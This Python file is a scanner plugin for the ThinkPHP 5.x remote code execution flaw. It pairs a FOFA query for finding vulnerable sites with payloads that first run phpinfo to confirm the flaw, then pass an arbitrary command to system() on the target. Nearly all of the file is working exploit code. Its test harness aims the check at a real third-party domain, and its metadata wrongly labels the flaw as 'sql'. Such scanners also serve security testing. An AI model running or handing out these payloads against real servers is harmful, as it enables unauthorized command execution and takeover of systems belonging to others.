#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'
from urllib import parse
# https://mp.weixin.qq.com/s/oWzDIIjJS2cwjb4rzOM4DQ
# http://www.vulnspy.com/cn-thinkphp-5.x-rce/thinkphp_5.x_(v5.0.23%E5%8F%8Av5.1.31%E4%BB%A5%E4%B8%8B%E7%89%88%E6%9C%AC)_%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%88getshell%EF%BC%89/
# 5.1.x < 5.1.31,
# 5.0.x    <= 5.0.23
# FastAdmin，layuiAdmin，DZHCMS，tpAdmin

'''
fofa :
 "( app=\"ThinkSNS\")||( app=\"eyoucms\")||( app=\"Onethink\")||( app=\"TPshop\")||( body=\"/admin/login/checkverify.html?tm=\" || body=\"snake后台登录\")||( title=\"基于ThinkPHP5和Bootstrap的极速后台开发框架\" || title=\"fastadmin\" || body=\"fastadmin.net\")||( body=\"class=\\\"verifyimg reload-verify\\\"\" && body=\"class=\\\"panel-lite\\\"\" && body=\"lyui\")||( body=\"/public/static/admin/css/dolphin.css\" || body=\"/admin.php/user/publics/signin.html\" || body=\"/public/static/admin/js/dolphin.js\")||( body=\"/public/static/dist/img/logo.png\" || body=\"/Public/Admin/dist/img/logo.png\" || body=\"Powered by WeMall\")||( app=\"layui\")||( body=\"/css/AdminLTE.css\" || body=\"/css/AdminLTE.min.css\")||( body=\"yuan1994\" && body=\"/static/admin/h-ui/css/H-ui.min.css\"&& body=\"href=\\\"/static/admin/h-ui.admin/css/H-ui.login.css\\\"\")||( body=\"/admin/publics/index.html\" && body=\"login-head\")||( body=\"/haoidcn/Admin/Public\")||( body=\"/css/H-ui.min.css\" || body=\"/css/H-ui.login.css\" || body=\"/h-ui.admin/\")||( title=\"Tplay\" || ( body=\"Tplay\" && body=\"layui\"))||( body=\"/public/static/js/qibo.js\" || body=\"qb_ui.css\")||( body=\"/public/static/css/pc_reset.css\" || body=\"/public/static/css/qb_ui.css\")||( body=\"/css/AdminLTE.css\" || body=\"/css/AdminLTE.min.css\")||( body=\"YFCMF\" && body=\"/public/others/maxlength.js\" || body=\"/yfcmf/yfcmf.js\")||( body=\"/home/memberorder/index.html\" || body=\"/home/showjoinin/index.html\")||( body=\"http://www.cltphp.com/\" || body=\"this.src='/user/login/verify.html?'+'id='+Math.random()\")||\"ThinkPHP5\"|| app=\"ThinkPHP\""
'''
def info(data):
    info = {
        "name": "thinkphp 5.1.31 getshell",
        "info": "thinkphp 5.1.31 getshell",
        "level": "high",
        "type": "sql",
    }
    return info

def prove(data):
    init(data,'thinkphp')
    if data['base_url']:
        pocs = ["index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1",
                "index.php?s=/index/\\think\\request/cache&key=1|phpinfo"]
        for path in ['','public/']:
            for poc in pocs:
                url = data[ 'base_url'] +path+ poc
                res = curl('get', url)
                if res != None and 'PHP Version' in res.text:
                    data['flag'] = 1
                    data['data'].append({"flag": url})
                    data['res'].append({"info": url, "key": "thinkphp 5.1.31 getshell"})
                    break
    return data

def exec(data):
    init(data,'web')
    if data['base_url']:
        pocs = ["index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=%s" %parse.quote_plus(data['cmd']),
                "index.php?s=/index/\\think\\request/cache&key=%s|system" %parse.quote_plus(data['cmd'])]
        for path in ['','public/']:
            for poc in pocs:
                url = data[ 'base_url'] + path + poc
                res = curl('get', url)
                if res != None and res.status_code == 200:
                    data['flag'] = 1
                    data['data'].append({"flag": url})
                    data['res'].append({"info": res.text, "key": "thinkphp 5.1.31 getshell"})
    return data

if __name__=='__main__':
    from script import init, curl
    print(prove({'url':'http://www.baidu.com','flag':-1,'data':[],'res':[]}))